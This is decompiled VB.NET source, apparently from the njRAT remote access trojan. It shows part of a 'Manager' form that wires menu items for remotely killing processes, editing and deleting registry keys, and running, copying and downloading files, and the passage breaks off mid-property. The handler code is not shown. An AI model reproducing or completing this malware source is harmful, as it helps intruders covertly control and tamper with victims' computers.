Imports System
Imports System.Collections
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports NJRAT.My

Namespace NJRAT
	' Token: 0x02000016 RID: 22
	<DesignerGenerated()>
	Public Partial Class Manager
		Inherits Form

		' Token: 0x0600030F RID: 783 RVA: 0x001616D8 File Offset: 0x0015FAD8
		<DebuggerNonUserCode()>
		Private Shared Sub __ENCAddToList(value As Object)
			Dim _ENCList As List(Of WeakReference) = Manager.__ENCList
			SyncLock _ENCList
				Dim flag As Boolean = Manager.__ENCList.Count = Manager.__ENCList.Capacity
				If flag Then
					Dim num As Integer = 0
					Dim num2 As Integer = 0
					Dim num3 As Integer = Manager.__ENCList.Count - 1
					Dim num4 As Integer = num2
					While True
						Dim num5 As Integer = num4
						Dim num6 As Integer = num3
						If num5 > num6 Then
							Exit For
						End If
						Dim weakReference As WeakReference = Manager.__ENCList(num4)
						flag = weakReference.IsAlive
						If flag Then
							Dim flag2 As Boolean = num4 <> num
							If flag2 Then
								Manager.__ENCList(num) = Manager.__ENCList(num4)
							End If
							num += 1
						End If
						num4 += 1
					End While
					Manager.__ENCList.RemoveRange(num, Manager.__ENCList.Count - num)
					Manager.__ENCList.Capacity = Manager.__ENCList.Count
				End If
				Manager.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
			End SyncLock
		End Sub

		' Token: 0x1700011C RID: 284
		' (get) Token: 0x06000312 RID: 786 RVA: 0x001647B8 File Offset: 0x00162BB8
		' (set) Token: 0x06000313 RID: 787 RVA: 0x001647D0 File Offset: 0x00162BD0
		Friend Overridable Property StatusStrip1 As StatusStrip
			<DebuggerNonUserCode()>
			Get
				Return Me._StatusStrip1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As StatusStrip)
				Me._StatusStrip1 = value
			End Set
		End Property

		' Token: 0x1700011D RID: 285
		' (get) Token: 0x06000314 RID: 788 RVA: 0x001647DC File Offset: 0x00162BDC
		' (set) Token: 0x06000315 RID: 789 RVA: 0x001647F4 File Offset: 0x00162BF4
		Friend Overridable Property SL As ToolStripStatusLabel
			<DebuggerNonUserCode()>
			Get
				Return Me._SL
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripStatusLabel)
				Dim value2 As EventHandler = AddressOf Me.SL_Click
				Dim flag As Boolean = Me._SL IsNot Nothing
				If flag Then
					RemoveHandler Me._SL.Click, value2
				End If
				Me._SL = value
				flag = (Me._SL IsNot Nothing)
				If flag Then
					AddHandler Me._SL.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700011E RID: 286
		' (get) Token: 0x06000316 RID: 790 RVA: 0x00164854 File Offset: 0x00162C54
		' (set) Token: 0x06000317 RID: 791 RVA: 0x0016486C File Offset: 0x00162C6C
		Friend Overridable Property pr As ToolStripProgressBar
			<DebuggerNonUserCode()>
			Get
				Return Me._pr
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripProgressBar)
				Me._pr = value
			End Set
		End Property

		' Token: 0x1700011F RID: 287
		' (get) Token: 0x06000318 RID: 792 RVA: 0x00164878 File Offset: 0x00162C78
		' (set) Token: 0x06000319 RID: 793 RVA: 0x00164890 File Offset: 0x00162C90
		Friend Overridable Property M1 As ContextMenuStrip
			<DebuggerNonUserCode()>
			Get
				Return Me._M1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ContextMenuStrip)
				Me._M1 = value
			End Set
		End Property

		' Token: 0x17000120 RID: 288
		' (get) Token: 0x0600031A RID: 794 RVA: 0x0016489C File Offset: 0x00162C9C
		' (set) Token: 0x0600031B RID: 795 RVA: 0x001648B4 File Offset: 0x00162CB4
		Friend Overridable Property KillToolStripMenuItem1 As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._KillToolStripMenuItem1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.KillToolStripMenuItem1_Click
				Dim flag As Boolean = Me._KillToolStripMenuItem1 IsNot Nothing
				If flag Then
					RemoveHandler Me._KillToolStripMenuItem1.Click, value2
				End If
				Me._KillToolStripMenuItem1 = value
				flag = (Me._KillToolStripMenuItem1 IsNot Nothing)
				If flag Then
					AddHandler Me._KillToolStripMenuItem1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000121 RID: 289
		' (get) Token: 0x0600031C RID: 796 RVA: 0x00164914 File Offset: 0x00162D14
		' (set) Token: 0x0600031D RID: 797 RVA: 0x0016492C File Offset: 0x00162D2C
		Friend Overridable Property KillDeleteToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._KillDeleteToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.KillDeleteToolStripMenuItem_Click
				Dim flag As Boolean = Me._KillDeleteToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._KillDeleteToolStripMenuItem.Click, value2
				End If
				Me._KillDeleteToolStripMenuItem = value
				flag = (Me._KillDeleteToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._KillDeleteToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000122 RID: 290
		' (get) Token: 0x0600031E RID: 798 RVA: 0x0016498C File Offset: 0x00162D8C
		' (set) Token: 0x0600031F RID: 799 RVA: 0x001649A4 File Offset: 0x00162DA4
		Friend Overridable Property RestartProcessToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._RestartProcessToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RestartProcessToolStripMenuItem_Click
				Dim flag As Boolean = Me._RestartProcessToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._RestartProcessToolStripMenuItem.Click, value2
				End If
				Me._RestartProcessToolStripMenuItem = value
				flag = (Me._RestartProcessToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._RestartProcessToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000123 RID: 291
		' (get) Token: 0x06000320 RID: 800 RVA: 0x00164A04 File Offset: 0x00162E04
		' (set) Token: 0x06000321 RID: 801 RVA: 0x00164A1C File Offset: 0x00162E1C
		Friend Overridable Property vmethod_26 As Timer
			<DebuggerNonUserCode()>
			Get
				Return Me._vmethod_26
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim value2 As EventHandler = AddressOf Me.vmethod_26_Tick
				Dim flag As Boolean = Me._vmethod_26 IsNot Nothing
				If flag Then
					RemoveHandler Me._vmethod_26.Tick, value2
				End If
				Me._vmethod_26 = value
				flag = (Me._vmethod_26 IsNot Nothing)
				If flag Then
					AddHandler Me._vmethod_26.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x17000124 RID: 292
		' (get) Token: 0x06000322 RID: 802 RVA: 0x00164A7C File Offset: 0x00162E7C
		' (set) Token: 0x06000323 RID: 803 RVA: 0x00164A94 File Offset: 0x00162E94
		Friend Overridable Property ImageList1 As ImageList
			<DebuggerNonUserCode()>
			Get
				Return Me._ImageList1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ImageList)
				Me._ImageList1 = value
			End Set
		End Property

		' Token: 0x17000125 RID: 293
		' (get) Token: 0x06000324 RID: 804 RVA: 0x00164AA0 File Offset: 0x00162EA0
		' (set) Token: 0x06000325 RID: 805 RVA: 0x00164AB8 File Offset: 0x00162EB8
		Friend Overridable Property ContextMenuStrip1 As ContextMenuStrip
			<DebuggerNonUserCode()>
			Get
				Return Me._ContextMenuStrip1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ContextMenuStrip)
				Me._ContextMenuStrip1 = value
			End Set
		End Property

		' Token: 0x17000126 RID: 294
		' (get) Token: 0x06000326 RID: 806 RVA: 0x00164AC4 File Offset: 0x00162EC4
		' (set) Token: 0x06000327 RID: 807 RVA: 0x00164ADC File Offset: 0x00162EDC
		Friend Overridable Property KillConnectionToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._KillConnectionToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.KillConnectionToolStripMenuItem_Click
				Dim flag As Boolean = Me._KillConnectionToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._KillConnectionToolStripMenuItem.Click, value2
				End If
				Me._KillConnectionToolStripMenuItem = value
				flag = (Me._KillConnectionToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._KillConnectionToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000127 RID: 295
		' (get) Token: 0x06000328 RID: 808 RVA: 0x00164B3C File Offset: 0x00162F3C
		' (set) Token: 0x06000329 RID: 809 RVA: 0x00164B54 File Offset: 0x00162F54
		Friend Overridable Property crg As ContextMenuStrip
			<DebuggerNonUserCode()>
			Get
				Return Me._crg
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ContextMenuStrip)
				Me._crg = value
			End Set
		End Property

		' Token: 0x17000128 RID: 296
		' (get) Token: 0x0600032A RID: 810 RVA: 0x00164B60 File Offset: 0x00162F60
		' (set) Token: 0x0600032B RID: 811 RVA: 0x00164B78 File Offset: 0x00162F78
		Friend Overridable Property RefreshToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._RefreshToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RefreshToolStripMenuItem_Click
				Dim flag As Boolean = Me._RefreshToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._RefreshToolStripMenuItem.Click, value2
				End If
				Me._RefreshToolStripMenuItem = value
				flag = (Me._RefreshToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._RefreshToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000129 RID: 297
		' (get) Token: 0x0600032C RID: 812 RVA: 0x00164BD8 File Offset: 0x00162FD8
		' (set) Token: 0x0600032D RID: 813 RVA: 0x00164BF0 File Offset: 0x00162FF0
		Friend Overridable Property EditToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._EditToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.EditToolStripMenuItem_Click
				Dim flag As Boolean = Me._EditToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._EditToolStripMenuItem.Click, value2
				End If
				Me._EditToolStripMenuItem = value
				flag = (Me._EditToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._EditToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700012A RID: 298
		' (get) Token: 0x0600032E RID: 814 RVA: 0x00164C50 File Offset: 0x00163050
		' (set) Token: 0x0600032F RID: 815 RVA: 0x00164C68 File Offset: 0x00163068
		Friend Overridable Property NewValueToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._NewValueToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.NewValueToolStripMenuItem_Click
				Dim flag As Boolean = Me._NewValueToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._NewValueToolStripMenuItem.Click, value2
				End If
				Me._NewValueToolStripMenuItem = value
				flag = (Me._NewValueToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._NewValueToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700012B RID: 299
		' (get) Token: 0x06000330 RID: 816 RVA: 0x00164CC8 File Offset: 0x001630C8
		' (set) Token: 0x06000331 RID: 817 RVA: 0x00164CE0 File Offset: 0x001630E0
		Friend Overridable Property DeleteToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._DeleteToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.DeleteToolStripMenuItem_Click
				Dim flag As Boolean = Me._DeleteToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._DeleteToolStripMenuItem.Click, value2
				End If
				Me._DeleteToolStripMenuItem = value
				flag = (Me._DeleteToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._DeleteToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700012C RID: 300
		' (get) Token: 0x06000332 RID: 818 RVA: 0x00164D40 File Offset: 0x00163140
		' (set) Token: 0x06000333 RID: 819 RVA: 0x00164D58 File Offset: 0x00163158
		Friend Overridable Property rimg As ImageList
			<DebuggerNonUserCode()>
			Get
				Return Me._rimg
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ImageList)
				Me._rimg = value
			End Set
		End Property

		' Token: 0x1700012D RID: 301
		' (get) Token: 0x06000334 RID: 820 RVA: 0x00164D64 File Offset: 0x00163164
		' (set) Token: 0x06000335 RID: 821 RVA: 0x00164D7C File Offset: 0x0016317C
		Friend Overridable Property crgk As ContextMenuStrip
			<DebuggerNonUserCode()>
			Get
				Return Me._crgk
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ContextMenuStrip)
				Me._crgk = value
			End Set
		End Property

		' Token: 0x1700012E RID: 302
		' (get) Token: 0x06000336 RID: 822 RVA: 0x00164D88 File Offset: 0x00163188
		' (set) Token: 0x06000337 RID: 823 RVA: 0x00164DA0 File Offset: 0x001631A0
		Friend Overridable Property RefreshToolStripMenuItem1 As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._RefreshToolStripMenuItem1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RefreshToolStripMenuItem1_Click
				Dim flag As Boolean = Me._RefreshToolStripMenuItem1 IsNot Nothing
				If flag Then
					RemoveHandler Me._RefreshToolStripMenuItem1.Click, value2
				End If
				Me._RefreshToolStripMenuItem1 = value
				flag = (Me._RefreshToolStripMenuItem1 IsNot Nothing)
				If flag Then
					AddHandler Me._RefreshToolStripMenuItem1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700012F RID: 303
		' (get) Token: 0x06000338 RID: 824 RVA: 0x00164E00 File Offset: 0x00163200
		' (set) Token: 0x06000339 RID: 825 RVA: 0x00164E18 File Offset: 0x00163218
		Friend Overridable Property CreateKeyToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._CreateKeyToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CreateKeyToolStripMenuItem_Click
				Dim flag As Boolean = Me._CreateKeyToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._CreateKeyToolStripMenuItem.Click, value2
				End If
				Me._CreateKeyToolStripMenuItem = value
				flag = (Me._CreateKeyToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._CreateKeyToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000130 RID: 304
		' (get) Token: 0x0600033A RID: 826 RVA: 0x00164E78 File Offset: 0x00163278
		' (set) Token: 0x0600033B RID: 827 RVA: 0x00164E90 File Offset: 0x00163290
		Friend Overridable Property DeleteSelectedToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._DeleteSelectedToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.DeleteSelectedToolStripMenuItem_Click
				Dim flag As Boolean = Me._DeleteSelectedToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._DeleteSelectedToolStripMenuItem.Click, value2
				End If
				Me._DeleteSelectedToolStripMenuItem = value
				flag = (Me._DeleteSelectedToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._DeleteSelectedToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000131 RID: 305
		' (get) Token: 0x0600033C RID: 828 RVA: 0x00164EF0 File Offset: 0x001632F0
		' (set) Token: 0x0600033D RID: 829 RVA: 0x00164F08 File Offset: 0x00163308
		Friend Overridable Property ContextMenuStrip2 As ContextMenuStrip
			<DebuggerNonUserCode()>
			Get
				Return Me._ContextMenuStrip2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ContextMenuStrip)
				Me._ContextMenuStrip2 = value
			End Set
		End Property

		' Token: 0x17000132 RID: 306
		' (get) Token: 0x0600033E RID: 830 RVA: 0x00164F14 File Offset: 0x00163314
		' (set) Token: 0x0600033F RID: 831 RVA: 0x00164F2C File Offset: 0x0016332C
		Friend Overridable Property StopToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._StopToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.StopToolStripMenuItem_Click
				Dim flag As Boolean = Me._StopToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._StopToolStripMenuItem.Click, value2
				End If
				Me._StopToolStripMenuItem = value
				flag = (Me._StopToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._StopToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000133 RID: 307
		' (get) Token: 0x06000340 RID: 832 RVA: 0x00164F8C File Offset: 0x0016338C
		' (set) Token: 0x06000341 RID: 833 RVA: 0x00164FA4 File Offset: 0x001633A4
		Friend Overridable Property PauseToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._PauseToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.PauseToolStripMenuItem_Click
				Dim flag As Boolean = Me._PauseToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._PauseToolStripMenuItem.Click, value2
				End If
				Me._PauseToolStripMenuItem = value
				flag = (Me._PauseToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._PauseToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000134 RID: 308
		' (get) Token: 0x06000342 RID: 834 RVA: 0x00165004 File Offset: 0x00163404
		' (set) Token: 0x06000343 RID: 835 RVA: 0x0016501C File Offset: 0x0016341C
		Friend Overridable Property StartToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._StartToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.StartToolStripMenuItem_Click
				Dim flag As Boolean = Me._StartToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._StartToolStripMenuItem.Click, value2
				End If
				Me._StartToolStripMenuItem = value
				flag = (Me._StartToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._StartToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000135 RID: 309
		' (get) Token: 0x06000344 RID: 836 RVA: 0x0016507C File Offset: 0x0016347C
		' (set) Token: 0x06000345 RID: 837 RVA: 0x00165094 File Offset: 0x00163494
		Friend Overridable Property ContextMenuStrip3 As ContextMenuStrip
			<DebuggerNonUserCode()>
			Get
				Return Me._ContextMenuStrip3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ContextMenuStrip)
				Me._ContextMenuStrip3 = value
			End Set
		End Property

		' Token: 0x17000136 RID: 310
		' (get) Token: 0x06000346 RID: 838 RVA: 0x001650A0 File Offset: 0x001634A0
		' (set) Token: 0x06000347 RID: 839 RVA: 0x001650B8 File Offset: 0x001634B8
		Friend Overridable Property UPToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._UPToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.UPToolStripMenuItem_Click
				Dim flag As Boolean = Me._UPToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._UPToolStripMenuItem.Click, value2
				End If
				Me._UPToolStripMenuItem = value
				flag = (Me._UPToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._UPToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000137 RID: 311
		' (get) Token: 0x06000348 RID: 840 RVA: 0x00165118 File Offset: 0x00163518
		' (set) Token: 0x06000349 RID: 841 RVA: 0x00165130 File Offset: 0x00163530
		Friend Overridable Property RefreshToolStripMenuItem2 As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._RefreshToolStripMenuItem2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RefreshToolStripMenuItem2_Click
				Dim flag As Boolean = Me._RefreshToolStripMenuItem2 IsNot Nothing
				If flag Then
					RemoveHandler Me._RefreshToolStripMenuItem2.Click, value2
				End If
				Me._RefreshToolStripMenuItem2 = value
				flag = (Me._RefreshToolStripMenuItem2 IsNot Nothing)
				If flag Then
					AddHandler Me._RefreshToolStripMenuItem2.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000138 RID: 312
		' (get) Token: 0x0600034A RID: 842 RVA: 0x00165190 File Offset: 0x00163590
		' (set) Token: 0x0600034B RID: 843 RVA: 0x001651A8 File Offset: 0x001635A8
		Friend Overridable Property RunToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._RunToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RunToolStripMenuItem_Click
				Dim flag As Boolean = Me._RunToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._RunToolStripMenuItem.Click, value2
				End If
				Me._RunToolStripMenuItem = value
				flag = (Me._RunToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._RunToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000139 RID: 313
		' (get) Token: 0x0600034C RID: 844 RVA: 0x00165208 File Offset: 0x00163608
		' (set) Token: 0x0600034D RID: 845 RVA: 0x00165220 File Offset: 0x00163620
		Friend Overridable Property Delete As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._Delete
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.DeleteToolStripMenuItem1_Click
				Dim flag As Boolean = Me._Delete IsNot Nothing
				If flag Then
					RemoveHandler Me._Delete.Click, value2
				End If
				Me._Delete = value
				flag = (Me._Delete IsNot Nothing)
				If flag Then
					AddHandler Me._Delete.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700013A RID: 314
		' (get) Token: 0x0600034E RID: 846 RVA: 0x00165280 File Offset: 0x00163680
		' (set) Token: 0x0600034F RID: 847 RVA: 0x00165298 File Offset: 0x00163698
		Friend Overridable Property EditToolStripMenuItem1 As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._EditToolStripMenuItem1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.EditToolStripMenuItem1_Click
				Dim flag As Boolean = Me._EditToolStripMenuItem1 IsNot Nothing
				If flag Then
					RemoveHandler Me._EditToolStripMenuItem1.Click, value2
				End If
				Me._EditToolStripMenuItem1 = value
				flag = (Me._EditToolStripMenuItem1 IsNot Nothing)
				If flag Then
					AddHandler Me._EditToolStripMenuItem1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700013B RID: 315
		' (get) Token: 0x06000350 RID: 848 RVA: 0x001652F8 File Offset: 0x001636F8
		' (set) Token: 0x06000351 RID: 849 RVA: 0x00165310 File Offset: 0x00163710
		Friend Overridable Property RenameToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._RenameToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RenameToolStripMenuItem_Click
				Dim flag As Boolean = Me._RenameToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._RenameToolStripMenuItem.Click, value2
				End If
				Me._RenameToolStripMenuItem = value
				flag = (Me._RenameToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._RenameToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700013C RID: 316
		' (get) Token: 0x06000352 RID: 850 RVA: 0x00165370 File Offset: 0x00163770
		' (set) Token: 0x06000353 RID: 851 RVA: 0x00165388 File Offset: 0x00163788
		Friend Overridable Property CopyToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._CopyToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CopyToolStripMenuItem_Click
				Dim flag As Boolean = Me._CopyToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._CopyToolStripMenuItem.Click, value2
				End If
				Me._CopyToolStripMenuItem = value
				flag = (Me._CopyToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._CopyToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700013D RID: 317
		' (get) Token: 0x06000354 RID: 852 RVA: 0x001653E8 File Offset: 0x001637E8
		' (set) Token: 0x06000355 RID: 853 RVA: 0x00165400 File Offset: 0x00163800
		Friend Overridable Property CutToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._CutToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CutToolStripMenuItem_Click
				Dim flag As Boolean = Me._CutToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._CutToolStripMenuItem.Click, value2
				End If
				Me._CutToolStripMenuItem = value
				flag = (Me._CutToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._CutToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700013E RID: 318
		' (get) Token: 0x06000356 RID: 854 RVA: 0x00165460 File Offset: 0x00163860
		' (set) Token: 0x06000357 RID: 855 RVA: 0x00165478 File Offset: 0x00163878
		Friend Overridable Property PasteToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._PasteToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.PasteToolStripMenuItem_Click
				Dim flag As Boolean = Me._PasteToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._PasteToolStripMenuItem.Click, value2
				End If
				Me._PasteToolStripMenuItem = value
				flag = (Me._PasteToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._PasteToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700013F RID: 319
		' (get) Token: 0x06000358 RID: 856 RVA: 0x001654D8 File Offset: 0x001638D8
		' (set) Token: 0x06000359 RID: 857 RVA: 0x001654F0 File Offset: 0x001638F0
		Friend Overridable Property DownloadToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._DownloadToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
